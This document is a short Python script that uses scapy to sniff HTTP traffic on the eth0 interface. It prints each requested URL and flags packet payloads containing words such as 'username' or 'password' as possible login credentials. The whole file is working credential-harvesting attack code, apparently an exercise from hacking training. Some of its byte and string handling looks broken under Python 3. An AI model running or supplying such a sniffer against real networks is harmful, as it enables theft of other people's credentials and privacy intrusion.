import scapy.all as scapy
from scapy.layers import http
# from scapy_http import http


def get_url(packet):
    # for detecting urls
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def sniff(interface):
    # prn it will excute a function which we will  give it after capturing packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # finding and printing Raw layer
        # print(packet[scapy.Raw].load)
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST >> \n" + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] possible username/password >>" + login_info +
                  "\n\n")


# ----interfaceon which you want to sniff
sniff("eth0")
